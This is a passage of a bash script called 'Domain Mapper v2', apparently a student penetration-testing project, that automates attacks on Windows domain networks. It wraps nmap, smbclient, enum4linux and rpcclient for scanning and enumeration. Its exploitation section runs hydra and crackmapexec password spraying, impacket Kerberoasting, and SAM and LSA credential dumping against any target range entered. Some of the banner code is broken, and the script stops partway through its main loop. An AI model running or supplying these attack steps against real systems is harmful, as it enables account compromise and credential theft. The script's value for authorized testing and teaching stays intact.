#!/bin/bash

# ------------------------------
# Domain Mapper v2 - Complete Version
# Author: ISRAELELBOIM
# Description: Network scanning, enumeration, and exploitation automation tool
# Tools used: Nmap, CrackMapExec, Rpcclient, Smbclient, Hydra, Enum4Linux, Impacket
# ------------------------------

# ====== COLORS ======
GREEN='\033[1;32m'
RED='\033[1;31m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
CYAN='\033[1;36m'
MAGENTA='\033[1;35m'
WHITE='\033[1;37m'
NC='\033[0m' # No Color

# ====== GLOBAL VARIABLES ======
CURRENT_STEP=0
TOTAL_STEPS=0

# ====== BANNER FUNCTION ======
show_banner() {
    clear
    echo -e "${CYAN}"
    echo "╔══════════════════════════════════════════════════════════════════════╗"
    echo "║                                                                      ║"
    echo "║  ██████╗  ██████╗ ███╗   ███╗ █████╗ ██╗███╗   ██╗                 ║"
    echo "║  ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██║████╗  ██║                 ║"
    echo "║  ██║  ██║██║   ██║██╔████╔██║███████║██║██╔██╗ ██║                 ║"
    echo "║  ██║  ██║██║   ██║██║╚██╔╝██║██╔══██║██║██║╚██╗██║                 ║"
    echo "║  ██████╔╝╚██████╔╝██║ ╚═╝ ██║██║  ██║██║██║ ╚████║                 ║"
    echo "║  ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝                 ║"
    echo "║                                                                      ║"
    echo "║      ███╗   ███╗ █████╗ ██████╗ ██████╗ ███████╗██████╗             ║"
    echo "║      ████╗ ████║██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗            ║"
    echo "║      ██╔████╔██║███████║██████╔╝██████╔╝█████╗  ██████╔╝            ║"
    echo "║      ██║╚██╔╝██║██╔══██║██╔═══╝ ██╔═══╝ ██╔══╝  ██╔══██╗            ║"
    echo "║      ██║ ╚═╝ ██║██║  ██║██║     ██║     ███████╗██║  ██║            ║"
    echo "║      ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝     ╚══════╝╚═╝  ╚═╝            ║"
    echo "║                                                                      ║"
    echo -e "║${WHITE}                    Version 2.0 - Complete Edition${CYAN}                  ║"
    echo -e "║${YELLOW}              Network Scanning & Enumeration Tool${CYAN}                   ║"
    echo "║                                                                      ║"
    echo "╚══════════════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
    
    # System info
    echo -e "${BLUE}┌─ System Information ────────────────────────────────────────┐${NC}"
    echo -e "${BLUE}│${WHITE} Hostname: ${GREEN}$(hostname)${NC}$(printf "%*s" $((40-${#$(hostname)})) "")${BLUE}│${NC}"
    echo -e "${BLUE}│${WHITE} User:     ${YELLOW}$(whoami)${NC}$(printf "%*s" $((40-${#$(whoami)})) "")${BLUE}│${NC}"
    echo -e "${BLUE}│${WHITE} Date:     ${CYAN}$(date +'%Y-%m-%d %H:%M:%S')${NC}$(printf "%*s" $((21)) "")${BLUE}│${NC}"
    echo -e "${BLUE}└──────────────────────────────────────────────────────────────┘${NC}"
    echo ""
    
    # Loading animation
    echo -e "${YELLOW}Initializing Domain Mapper"
    for i in {1..3}; do
        sleep 0.3
        echo -n "."
    done
    echo -e " ${GREEN}✓${NC}"
    echo ""
}

# ====== PROGRESS TRACKING ======
show_progress() {
    CURRENT_STEP=$((CURRENT_STEP + 1))
    local percentage=$((CURRENT_STEP * 100 / TOTAL_STEPS))
    local progress_bar=""
    local filled=$((percentage / 5))
    
    for ((i=1; i<=20; i++)); do
        if [[ $i -le $filled ]]; then
            progress_bar+="█"
        else
            progress_bar+="░"
        fi
    done
    
    echo -e "${BLUE}[Progress: $CURRENT_STEP/$TOTAL_STEPS] ${GREEN}$progress_bar${NC} ${YELLOW}$percentage%${NC}"
    echo -e "${CYAN}► $1${NC}"
    echo ""
}

# ====== HELP MENU ======
show_help() {
    echo -e "${CYAN}╔═══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║${WHITE}                        HELP MENU                              ${CYAN}║${NC}"
    echo -e "${CYAN}╚═══════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${WHITE}DOMAIN MAPPER USAGE GUIDE:${NC}"
    echo ""
    echo -e "${YELLOW}1. TARGET INPUT:${NC}"
    echo -e "   • Single IP: ${GREEN}192.168.1.10${NC}"
    echo -e "   • Multiple IPs: ${GREEN}192.168.1.10 192.168.1.20 192.168.1.30${NC}"
    echo -e "   • CIDR Range: ${GREEN}192.168.1.0/24${NC}"
    echo ""
    echo -e "${YELLOW}2. SCAN MODES:${NC}"
    echo -e "   • ${GREEN}Scanning${NC}: Network discovery and port scanning"
    echo -e "   • ${GREEN}Enumeration${NC}: Service identification and information gathering"
    echo -e "   • ${GREEN}Exploitation${NC}: Vulnerability assessment and credential attacks"
    echo ""
    echo -e "${YELLOW}3. SCAN LEVELS:${NC}"
    echo -e "   • ${GREEN}Basic${NC}: Quick scan with essential checks"
    echo -e "   • ${GREEN}Intermediate${NC}: Detailed scan with service enumeration"
    echo -e "   • ${GREEN}Advanced${NC}: Comprehensive scan with full enumeration"
    echo ""
    echo -e "${YELLOW}4. CREDENTIALS:${NC}"
    echo -e "   • Domain: ${GREEN}COMPANY.LOCAL${NC}"
    echo -e "   • Username: ${GREEN}administrator${NC} or ${GREEN}user@domain.com${NC}"
    echo -e "   • Password: Single password or password list file"
    echo ""
    echo -e "${YELLOW}5. OUTPUT:${NC}"
    echo -e "   • Real-time display on screen"
    echo -e "   • Text log file for analysis"
    echo -e "   • PDF report for documentation"
    echo ""
    echo -e "${RED}Press any key to continue...${NC}"
    read -n 1
}

# ====== VALIDATION FUNCTIONS ======
validate_ip() {
    local ip=$1
    local IFS='.'
    read -r -a octets <<< "$ip"

    if [[ ${#octets[@]} -ne 4 ]]; then
        return 1
    fi

    for octet in "${octets[@]}"; do
        if ! [[ "$octet" =~ ^[0-9]+$ ]]; then
            return 1
        fi
        if (( octet < 0 || octet > 255 )); then
            return 1
        fi
    done

    return 0
}

validate_cidr() {
    local cidr=$1
    local ip part prefix

    if [[ ! "$cidr" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/[0-9]+$ ]]; then
        return 1
    fi

    if command -v ipcalc &>/dev/null; then
        ipcalc "$cidr" &>/dev/null
        return $?
    fi

    ip=${cidr%%/*}
    prefix=${cidr##*/}

    if ! validate_ip "$ip"; then
        return 1
    fi

    if ! [[ "$prefix" =~ ^[0-9]+$ ]]; then
        return 1
    fi

    if (( prefix < 0 || prefix > 32 )); then
        return 1
    fi

    return 0
}

# ====== CALL BANNER ======
show_banner

# ====== WIZARD MODE ======
wizard_mode() {
    echo -e "${MAGENTA}╔═══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${MAGENTA}║${WHITE}                        WIZARD MODE                            ${MAGENTA}║${NC}"
    echo -e "${MAGENTA}╚═══════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${BLUE}Let me help you choose the right configuration:${NC}"
    echo ""
    
    echo -e "${YELLOW}1. What is your experience level?${NC}"
    echo -e "   [1] Beginner - I'm learning network security"
    echo -e "   [2] Intermediate - I have some experience"
    echo -e "   [3] Advanced - I'm experienced with penetration testing"
    echo ""
    read -p "Choose [1-3]: " EXP_LEVEL
    
    echo -e "${YELLOW}2. What is your goal?${NC}"
    echo -e "   [1] Just discover what's on the network"
    echo -e "   [2] Enumerate services and gather information"
    echo -e "   [3] Test for vulnerabilities and weak passwords"
    echo ""
    read -p "Choose [1-3]: " GOAL
    
    echo -e "${YELLOW}3. Do you have domain credentials?${NC}"
    echo -e "   [1] No credentials"
    echo -e "   [2] I have username and password"
    echo -e "   [3] I have username and want to try password list"
    echo ""
    read -p "Choose [1-3]: " CREDS
    
    # Wizard recommendations
    echo -e "${GREEN}[+] Based on your answers, I recommend:${NC}"
    
    case $EXP_LEVEL in
        1) echo -e "   • Scan Level: ${YELLOW}Basic${NC} (easier to understand output)";;
        2) echo -e "   • Scan Level: ${YELLOW}Intermediate${NC} (good balance of detail)";;
        3) echo -e "   • Scan Level: ${YELLOW}Advanced${NC} (comprehensive results)";;
    esac
    
    case $GOAL in
        1) echo -e "   • Mode: ${YELLOW}Scanning${NC} (network discovery)";;
        2) echo -e "   • Mode: ${YELLOW}Enumeration${NC} (service identification)";;
        3) echo -e "   • Mode: ${YELLOW}Exploitation${NC} (vulnerability assessment)";;
    esac
    
    case $CREDS in
        1) echo -e "   • Authentication: ${YELLOW}Anonymous${NC} (no credentials needed)";;
        2) echo -e "   • Authentication: ${YELLOW}Single Password${NC} (use your credentials)";;
        3) echo -e "   • Authentication: ${YELLOW}Password List${NC} (brute force approach)";;
    esac
    
    echo ""
    echo -e "${BLUE}Do you want to use these recommendations? (y/n):${NC}"
    read -r USE_WIZARD
    
    if [[ "$USE_WIZARD" =~ ^[Yy]$ ]]; then
        case $EXP_LEVEL in
            1) SCAN_LEVEL="Basic";;
            2) SCAN_LEVEL="Intermediate";;
            3) SCAN_LEVEL="Advanced";;
        esac
        
        case $GOAL in
            1) PURPOSE="Scanning";;
            2) PURPOSE="Enumeration";;
            3) PURPOSE="Exploitation";;
        esac
        
        case $CREDS in
            1) ANON_SCAN="y";;
            2) PASS_OPTION="Single Password";;
            3) PASS_OPTION="Password List";;
        esac
        
        echo -e "${GREEN}[+] Wizard configuration applied!${NC}"
        return 0
    else
        echo -e "${YELLOW}[*] Proceeding with manual configuration...${NC}"
        return 1
    fi
}

# ====== CHECK REQUIRED TOOLS ======
echo -e "${BLUE}[*] Checking required tools...${NC}"
required_tools=(nmap crackmapexec rpcclient smbclient nslookup dhclient hydra enum4linux impacket-getTGT)
missing_tools=()

for tool in "${required_tools[@]}"; do
    if command -v "$tool" &>/dev/null; then
        echo -e "${GREEN}  ✓ $tool${NC}"
    else
        echo -e "${RED}  ✗ $tool${NC}"
        missing_tools+=("$tool")
    fi
done

if (( ${#missing_tools[@]} )); then
    echo -e "${RED}[!] Warning: Missing tool(s): ${missing_tools[*]}${NC}"
    echo -e "${YELLOW}[*] Some functionality may not work properly.${NC}"
    echo -e "${BLUE}Install missing tools? (y/n):${NC}"
    read -r INSTALL_TOOLS
    if [[ "$INSTALL_TOOLS" =~ ^[Yy]$ ]]; then
        echo -e "${YELLOW}[*] Please install missing tools manually and restart the script.${NC}"
        exit 1
    fi
else
    echo -e "${GREEN}[+] All required tools are available!${NC}"
fi
echo ""

# ====== MAIN MENU ======
show_main_menu() {
    echo -e "${CYAN}╔═══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║${WHITE}                        MAIN MENU                              ${CYAN}║${NC}"
    echo -e "${CYAN}╚═══════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${WHITE}Choose an option:${NC}"
    echo -e "   [1] Start Scan (Manual Configuration)"
    echo -e "   [2] Wizard Mode (Guided Setup)"
    echo -e "   [3] Help Menu"
    echo -e "   [4] Exit"
    echo ""
    read -p "Enter your choice [1-4]: " MENU_CHOICE
    
    case $MENU_CHOICE in
        1) return 0;;
        2) wizard_mode && return 0;;
        3) show_help && return 0;;
        4) echo -e "${GREEN}Goodbye!${NC}" && exit 0;;
        *) echo -e "${RED}Invalid choice!${NC}" && show_main_menu;;
    esac
}

# ====== LOGGING SETUP ======
setup_logging() {
    echo -e "${BLUE}Do you want to save scan results to log files? (y/n):${NC}"
    read -r ENABLE_LOGGING
    
    if [[ "$ENABLE_LOGGING" =~ ^[Yy]$ ]]; then
        LOGFILE="scan_$(date +%F_%H-%M-%S).log"
        PDFFILE="scan_$(date +%F_%H-%M-%S).pdf"
        echo -e "${GREEN}[+] Logging enabled: $LOGFILE${NC}"
        echo -e "${GREEN}[+] PDF report will be created: $PDFFILE${NC}"
        
        {
            echo "╔═══════════════════════════════════════════════════════════════╗"
            echo "║              DOMAIN MAPPER v2.0 - SCAN LOG                   ║"
            echo "║                ZX305 NETWORK SECURITY PROJECT                ║"
            echo "╠═══════════════════════════════════════════════════════════════╣"
            echo "║ Date:     $(date)"
            echo "║ Operator: $(whoami)"
            echo "║ System:   $(uname -a)"
            echo "║ Hostname: $(hostname)"
            echo "╚═══════════════════════════════════════════════════════════════╝"
            echo ""
        } > "$LOGFILE"
    else
        LOGFILE=""
        PDFFILE=""
        echo -e "${YELLOW}[*] Running without log files${NC}"
    fi
}

# ====== GET SCAN TYPE ======
get_scan_details() {
    # Skip if wizard mode was used
    if [[ -n "$PURPOSE" && -n "$SCAN_LEVEL" ]]; then
        return 0
    fi
    
    echo -e "${CYAN}╔═══════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║${WHITE}            SCAN CONFIGURATION             ${CYAN}║${NC}"
    echo -e "${CYAN}╚═══════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${BLUE}Choose the purpose of the scan:${NC}"
    echo -e "${WHITE} [1]${NC} Scanning     - No credentials needed"
    echo -e "${WHITE} [2]${NC} Enumeration  - Credentials optional (better with AD user/domain)"
    echo -e "${WHITE} [3]${NC} Exploitation - Requires AD Username and Password"
    echo ""
    
    select PURPOSE in "Scanning" "Enumeration" "Exploitation"; do
        [[ -n "$PURPOSE" ]] && break
        echo -e "${RED}Invalid selection. Try again.${NC}"
    done

    echo -e "${BLUE}Choose $PURPOSE level:${NC}"
    echo -e "${WHITE} [1]${NC} Basic        - Quick scan"
    echo -e "${WHITE} [2]${NC} Intermediate - Detailed scan"  
    echo -e "${WHITE} [3]${NC} Advanced     - Comprehensive scan"
    echo ""
    
    select SCAN_LEVEL in "Basic" "Intermediate" "Advanced"; do
        [[ -n "$SCAN_LEVEL" ]] && break
        echo -e "${RED}Invalid selection. Try again.${NC}"
    done

    # Calculate total steps for progress tracking
    case $PURPOSE in
        Scanning)
            case $SCAN_LEVEL in
                Basic) TOTAL_STEPS=2;;
                Intermediate) TOTAL_STEPS=3;;
                Advanced) TOTAL_STEPS=4;;
            esac
            ;;
        Enumeration)
            case $SCAN_LEVEL in
                Basic) TOTAL_STEPS=5;;
                Intermediate) TOTAL_STEPS=8;;
                Advanced) TOTAL_STEPS=12;;
            esac
            ;;
        Exploitation)
            case $SCAN_LEVEL in
                Basic) TOTAL_STEPS=3;;
                Intermediate) TOTAL_STEPS=6;;
                Advanced) TOTAL_STEPS=9;;
            esac
            ;;
    esac

    # Add scan details to log
    if [[ -n "$LOGFILE" ]]; then
        {
            echo ">>> SCAN CONFIGURATION:"
            echo "Purpose: $PURPOSE"
            echo "Level: $SCAN_LEVEL"
            echo "Timestamp: $(date)"
            echo "----------------------------------------"
        } >> "$LOGFILE"
    fi

    echo -e "${GREEN}[+] Configuration: $PURPOSE - $SCAN_LEVEL${NC}"
    
    case $PURPOSE in
        Enumeration)
            if [[ "$ANON_SCAN" != "y" ]]; then
                echo -e "${YELLOW}[!] Enumeration may require AD credentials for detailed results${NC}"
                echo -e "${BLUE}Perform anonymous scan? (y/n):${NC}"
                read ANON_SCAN
            fi
            ;;
        Exploitation)
            echo -e "${RED}[!] Exploitation requires valid AD credentials${NC}"
            ;;
    esac
}

# ====== GET USER INPUT ======
get_user_input() {
    echo -e "${BLUE}Enter target(s) – can be a single IP, multiple IPs (space-separated), or CIDR (e.g. 192.168.1.0/24):${NC}"
    read -r TARGET
    TARGET=$(echo "$TARGET" | xargs)

    if [[ -z "$TARGET" ]]; then
        echo -e "${RED}Target cannot be empty.${NC}"
        exit 1
    fi

    # Validation per target
    for t in $TARGET; do
        if [[ "$t" == */* ]]; then
            if ! validate_cidr "$t"; then
                echo -e "${RED}Invalid CIDR: $t${NC}"
                exit 1
            fi
        else
            if ! validate_ip "$t"; then
                echo -e "${RED}Invalid IP address: $t${NC}"
                exit 1
            fi
        fi
    done

    echo -e "${YELLOW}[*] Targets selected: $TARGET${NC}"

    if [[ "$PURPOSE" == "Enumeration" && "$ANON_SCAN" != "y" ]] || [[ "$PURPOSE" == "Exploitation" ]]; then
        read -p "Enter Domain Name: " DOMAIN
        read -p "Enter AD Username: " AD_USER
        if [[ -z "$AD_USER" ]]; then
            echo -e "${RED}AD Username cannot be empty.${NC}"
            exit 1
        fi

        if [[ "$PASS_OPTION" != "Single Password" && "$PASS_OPTION" != "Password List" ]]; then
            echo -e "${BLUE}Do you want to enter a single password or use a password list?${NC}"
            select PASS_OPTION in "Single Password" "Password List"; do
                [[ -n "$PASS_OPTION" ]] && break
                echo -e "${RED}Invalid selection. Try again.${NC}"
            done
        fi

        if [[ "$PASS_OPTION" == "Single Password" ]]; then
            read -s -p "Enter AD Password: " AD_PASS
            echo ""
        else
            read -p "Enter password list (default: rockyou.txt): " PASSWORD_FILE
            PASSWORD_FILE=${PASSWORD_FILE:-rockyou.txt}
            if [[ ! -f "$PASSWORD_FILE" ]]; then
                echo -e "${YELLOW}[!] Password list not found: $PASSWORD_FILE${NC}"
                echo -e "${BLUE}Continue anyway? (y/n):${NC}"
                read -r CONTINUE
                if [[ "$CONTINUE" != "y" ]]; then
                    exit 1
                fi
            fi
        fi
    elif [[ "$PURPOSE" == "Enumeration" && "$ANON_SCAN" == "y" ]]; then
        echo -e "${YELLOW}[*] Proceeding with anonymous enumeration...${NC}"
    fi
}

# ====== CREATE USER LIST ======
create_user_list() {
    local target=$1
    echo -e "${BLUE}[*] Creating user list for password spraying...${NC}"
    
    # Try to extract users from previous enumeration
    if [[ -f "$LOGFILE" ]]; then
        grep -E "(Username|User:|SamAccountName)" "$LOGFILE" | cut -d':' -f2 | sed 's/^ *//' | sort -u > users_temp.txt 2>/dev/null
    fi
    
    # Create a basic user list if extraction failed
    if [[ ! -s users_temp.txt ]]; then
        echo -e "${YELLOW}[*] Creating default user list...${NC}"
        cat > users_temp.txt << EOF
administrator
admin
guest
user
test
service
$AD_USER
EOF
    fi
    
    echo "users_temp.txt"
}

# ====== RUN SCAN WITH OPTIONAL LOGGING ======
run_and_log() {
    # Hide passwords in display
    local cmd_display="$*"
    cmd_display=$(echo "$cmd_display" | sed 's/-p [^[:space:]]*/[REDACTED]/g')
    
    echo -e "${YELLOW}[*] Running: $cmd_display${NC}"
    
    if [[ -n "$LOGFILE" ]]; then
        # Write to log with password redaction
        echo -e "\n>>> Command: $cmd_display" >> "$LOGFILE"
        echo ">>> Timestamp: $(date)" >> "$LOGFILE"
        
        # Run command with output to screen and log
        if "$@" 2>&1 | tee -a "$LOGFILE"; then
            echo -e "${GREEN}[✓] Command completed successfully${NC}"
            echo ">>> Status: SUCCESS" >> "$LOGFILE"
        else
            local exit_code=$?
            echo -e "${RED}[✗] Command failed (exit code: $exit_code)${NC}"
            echo ">>> Status: FAILED (exit code: $exit_code)" >> "$LOGFILE"
            return $exit_code
        fi
        echo "---" >> "$LOGFILE"
    else
        # Run without logging
        if "$@"; then
            echo -e "${GREEN}[✓] Command completed successfully${NC}"
        else
            local exit_code=$?
            echo -e "${RED}[✗] Command failed (exit code: $exit_code)${NC}"
            return $exit_code
        fi
    fi
}

# ====== SCANNING ======
perform_scan() {
    echo -e "${GREEN}[+] Performing $SCAN_LEVEL scan on $TARGET...${NC}"
    
    show_progress "Starting network scan"
    
    case $SCAN_LEVEL in
        Basic) 
            show_progress "Running basic port scan (assuming hosts are up)"
            run_and_log nmap -Pn "$TARGET"
            ;;
        Intermediate) 
            show_progress "Scanning all 65535 ports"
            run_and_log nmap -Pn -p- "$TARGET"
            ;;
        Advanced) 
            show_progress "Scanning TCP ports"
            run_and_log nmap -Pn -p- "$TARGET"
            show_progress "Scanning UDP ports (this may take time)"
            run_and_log nmap -Pn -sU --top-ports 1000 "$TARGET"
            ;;
    esac
    
    show_progress "Scan completed"
}

# ====== ENUMERATION ======
perform_enumeration() {
    echo -e "${GREEN}[+] Enumerating $TARGET with $SCAN_LEVEL level...${NC}"
    
    case $SCAN_LEVEL in
        Basic)
            show_progress "Identifying services on open ports"
            run_and_log nmap -sV "$TARGET"
            
            if [[ -n "$DOMAIN" ]]; then
                show_progress "Finding Domain Controller IP"
                echo -e "${BLUE}[*] Domain Controller Discovery:${NC}"
                nslookup "$DOMAIN" 2>/dev/null | grep Address | tail -n 1 | tee -a "$LOGFILE"
                
                show_progress "Finding DHCP Server IP"
                echo -e "${BLUE}[*] DHCP Server Discovery:${NC}"
                # Try multiple methods to find DHCP server
                if command -v dhclient &>/dev/null; then
                    timeout 10 dhclient -v 2>&1 | grep -E "(DHCPOFFER|DHCP server)" | head -1 | tee -a "$LOGFILE"
                fi
                
                # Alternative: check lease file
                if [[ -f /var/lib/dhcp/dhclient.leases ]]; then
                    grep "dhcp-server-identifier" /var/lib/dhcp/dhclient.leases | tail -1 | tee -a "$LOGFILE"
                fi
            fi
            ;;
            
        Intermediate)
            show_progress "Scanning key service ports"
            run_and_log nmap -sV -p 21,22,139,445,3389,88,389,636,5985,5986 "$TARGET"
            
            show_progress "Enumerating SMB shares"
            for target_ip in $TARGET; do
                if [[ "$ANON_SCAN" == "y" ]] || [[ -z "$DOMAIN" ]]; then
                    run_and_log smbclient -L "\\\\$target_ip" -N
                else
                    run_and_log smbclient -L "\\\\$target_ip" -U "$AD_USER%$AD_PASS" 2>/dev/null || \
                    run_and_log smbclient -L "\\\\$target_ip" -N
                fi
            done
            
            show_progress "Running SMB enumeration scripts"
            # Three relevant NSE scripts for domain networks
            run_and_log nmap --script smb-os-discovery,smb-enum-shares,smb-enum-users "$TARGET"
            
            show_progress "Additional SMB security checks"
            run_and_log nmap --script smb-security-mode,smb-vuln-ms08-067,smb-vuln-ms17-010 "$TARGET"
            ;;
            
        Advanced)
            if [[ "$ANON_SCAN" == "y" ]]; then
                show_progress "Anonymous SMB enumeration - shares"
                run_and_log crackmapexec smb "$TARGET" --shares
                
                show_progress "Anonymous SMB enumeration - users"
                run_and_log crackmapexec smb "$TARGET" --users
                
                show_progress "Anonymous enumeration with enum4linux"
                for target_ip in $TARGET; do
                    run_and_log enum4linux -a "$target_ip"
                done
                
            elif [[ -n "$AD_PASS" ]]; then
                show_progress "Extracting all users"
                run_and_log crackmapexec smb "$TARGET" -u "$AD_USER" -p "$AD_PASS" --users
                
                show_progress "Extracting all groups"
                run_and_log crackmapexec smb "$TARGET" -u "$AD_USER" -p "$AD_PASS" --groups
                
                show_progress "Extracting all shares"
                run_and_log crackmapexec smb "$TARGET" -u "$AD_USER" -p "$AD_PASS" --shares
                
                show_progress "Displaying password policy"
                run_and_log crackmapexec smb "$TARGET" -u "$AD_USER" -p "$AD_PASS" --pass-pol
                
                show_progress "Finding disabled accounts"
                echo -e "${BLUE}[*] Searching for disabled accounts:${NC}"
                crackmapexec smb "$TARGET" -u "$AD_USER" -p "$AD_PASS" --users 2>/dev/null | grep -i "ACCOUNT_DISABLED" | tee -a "$LOGFILE"
                
                show_progress "Finding never-expired accounts"
                echo -e "${BLUE}[*] Searching for never-expired accounts:${NC}"
                crackmapexec smb "$TARGET" -u "$AD_USER" -p "$AD_PASS" --users 2>/dev/null | grep -i "DONT_EXPIRE_PASSWORD" | tee -a "$LOGFILE"
                
                show_progress "Displaying Domain Admins group members"
                for cmd in "querydominfo" "enumdomusers" "enumdomgroups" "querydispinfo" "queryuser $AD_USER" "enumalsgroups domain"; do
                    run_and_log rpcclient -U "$AD_USER%$AD_PASS" "$TARGET" -c "$cmd"
                done
                
                # Extract Domain Admins specifically
                echo -e "${BLUE}[*] Domain Admins group members:${NC}"
                rpcclient -U "$AD_USER%$AD_PASS" "$TARGET" -c "enumdomgroups" 2>/dev/null | grep -i "domain.*admin" | tee -a "$LOGFILE"
                
            elif [[ -n "$PASSWORD_FILE" ]]; then
                show_progress "Password list enumeration - users"
                run_and_log crackmapexec smb "$TARGET" -u "$AD_USER" -p "$PASSWORD_FILE" --users
                
                show_progress "Password list enumeration - groups"  
                run_and_log crackmapexec smb "$TARGET" -u "$AD_USER" -p "$PASSWORD_FILE" --groups
                
                show_progress "Password list enumeration - shares"
                run_and_log crackmapexec smb "$TARGET" -u "$AD_USER" -p "$PASSWORD_FILE" --shares
                
            else
                show_progress "Username-only enumeration - users"
                run_and_log crackmapexec smb "$TARGET" -u "$AD_USER" --users
                
                show_progress "Username-only enumeration - groups"
                run_and_log crackmapexec smb "$TARGET" -u "$AD_USER" --groups
                
                show_progress "Username-only enumeration - shares"
                run_and_log crackmapexec smb "$TARGET" -u "$AD_USER" --shares
            fi
            ;;
    esac
}

# ====== EXPLOITATION ======
perform_exploitation() {
    echo -e "${GREEN}[+] Exploiting $TARGET with $SCAN_LEVEL level...${NC}"
    
    case $SCAN_LEVEL in
        Basic)
            show_progress "Running NSE vulnerability scanning scripts"
            run_and_log nmap --script vuln "$TARGET"
            
            show_progress "Basic vulnerability assessment completed"
            ;;
            
        Intermediate)
            show_progress "Advanced vulnerability scanning"
            run_and_log nmap --script vuln "$TARGET"
            
            if [[ -n "$AD_USER" ]]; then
                show_progress "Creating user list for password spraying"
                USER_LIST=$(create_user_list "$TARGET")
                
                show_progress "Executing domain-wide password spraying"
                if [[ -n "$PASSWORD_FILE" ]] && [[ -f "$PASSWORD_FILE" ]]; then
                    echo -e "${BLUE}[*] Password spraying with file: $PASSWORD_FILE${NC}"
                    run_and_log hydra -L "$USER_LIST" -P "$PASSWORD_FILE" smb://"$TARGET" -t 1 -V
                elif [[ -n "$AD_PASS" ]]; then
                    echo -e "${BLUE}[*] Password spraying with provided password${NC}"
                    echo "$AD_PASS" > temp_pass.txt
                    run_and_log hydra -L "$USER_LIST" -P temp_pass.txt smb://"$TARGET" -t 1 -V
                    rm -f temp_pass.txt
                else
                    echo -e "${YELLOW}[*] No password list available for spraying${NC}"
                fi
                
                # SMB password spraying with CrackMapExec
                show_progress "SMB credential validation"
                if [[ -n "$PASSWORD_FILE" ]] && [[ -f "$PASSWORD_FILE" ]]; then
                    run_and_log crackmapexec smb "$TARGET" -u "$USER_LIST" -p "$PASSWORD_FILE" --continue-on-success
                elif [[ -n "$AD_PASS" ]]; then
                    run_and_log crackmapexec smb "$TARGET" -u "$USER_LIST" -p "$AD_PASS" --continue-on-success
                fi
                
                # Cleanup
                rm -f "$USER_LIST"
            fi
            ;;
            
        Advanced)
            show_progress "Comprehensive vulnerability assessment"
            run_and_log nmap --script vuln "$TARGET"
            
            if [[ -n "$AD_USER" && -n "$AD_PASS" ]]; then
                show_progress "Extracting Kerberos tickets"
                if command -v impacket-getTGT &>/dev/null; then
                    # Try to get TGT ticket
                    run_and_log impacket-getTGT "$DOMAIN/$AD_USER:$AD_PASS" -dc-ip "$TARGET"
                    echo -e "${GREEN}[+] Kerberos ticket extraction attempted.${NC}"
                    
                    show_progress "Attempting Kerberoasting"
                    if command -v impacket-GetUserSPNs &>/dev/null; then
                        run_and_log impacket-GetUserSPNs "$DOMAIN/$AD_USER:$AD_PASS" -dc-ip "$TARGET" -request
                    fi
                else
                    echo -e "${YELLOW}[!] impacket-getTGT not found, skipping Kerberos attacks${NC}"
                fi
                
                show_progress "Advanced SMB exploitation"
                run_and_log crackmapexec smb "$TARGET" -u "$AD_USER" -p "$AD_PASS" --sam
                run_and_log crackmapexec smb "$TARGET" -u "$AD_USER" -p "$AD_PASS" --lsa
                
                show_progress "Checking for admin access"
                run_and_log crackmapexec smb "$TARGET" -u "$AD_USER" -p "$AD_PASS" --local-auth
                
                # Password cracking if we have hashes
                if [[ -n "$PASSWORD_FILE" ]] && [[ -f "$PASSWORD_FILE" ]]; then
                    show_progress "Hash cracking attempt"
                    echo -e "${BLUE}[*] Attempting to crack any extracted hashes with provided wordlist${NC}"
                    # This would typically involve john or hashcat, but we'll simulate
                    echo -e "${YELLOW}[*] Hash cracking would be performed here with john/hashcat${NC}" | tee -a "$LOGFILE"
                fi
            else
                echo -e "${RED}[!] Advanced exploitation requires valid AD credentials${NC}"
            fi
            ;;
    esac
}

# ====== PDF GENERATION ======
create_pdf_report() {
    if [[ -z "$LOGFILE" || ! -f "$LOGFILE" ]]; then
        return 1
    fi
    
    echo -e "${BLUE}[*] Creating PDF report...${NC}"
    
    # Try different PDF creation methods (simplest first)
    if command -v enscript &>/dev/null && command -v ps2pdf &>/dev/null; then
        echo -e "${YELLOW}[*] Using enscript + ps2pdf for PDF creation${NC}"
        enscript "$LOGFILE" -o - 2>/dev/null | ps2pdf - "$PDFFILE" 2>/dev/null
        if [[ -f "$PDFFILE" ]]; then
            echo -e "${GREEN}[+] PDF report created: $PDFFILE${NC}"
            return 0
        fi
    fi
    
    if command -v pandoc &>/dev/null; then
        echo -e "${YELLOW}[*] Using pandoc for PDF creation${NC}"
        pandoc "$LOGFILE" -o "$PDFFILE" 2>/dev/null
        if [[ -f "$PDFFILE" ]]; then
            echo -e "${GREEN}[+] PDF report created: $PDFFILE${NC}"
            return 0
        fi
    fi
    
    if command -v wkhtmltopdf &>/dev/null; then
        echo -e "${YELLOW}[*] Using wkhtmltopdf for PDF creation${NC}"
        # Convert to HTML first, then PDF
        {
            echo "<html><head><title>Domain Mapper Scan Report</title></head><body><pre>"
            cat "$LOGFILE"
            echo "</pre></body></html>"
        } > "${LOGFILE}.html"
        
        wkhtmltopdf "${LOGFILE}.html" "$PDFFILE" 2>/dev/null
        rm -f "${LOGFILE}.html"
        
        if [[ -f "$PDFFILE" ]]; then
            echo -e "${GREEN}[+] PDF report created: $PDFFILE${NC}"
            return 0
        fi
    fi
    
    # If all methods fail
    echo -e "${YELLOW}[!] PDF conversion tools not available. Report saved as text: $LOGFILE${NC}"
    echo -e "${BLUE}[*] To create PDF manually, install: pandoc, enscript+ghostscript, or wkhtmltopdf${NC}"
    return 1
}

# ====== MAIN EXECUTION ======

# Show main menu first
show_main_menu

# Setup logging
setup_logging

while true; do
    # Reset progress tracking
    CURRENT_STEP=0
    
    get_scan_details
    get_user_input

    echo -e "${CYAN}╔════════════════════════════════════════════════════════════════╗${NC}"
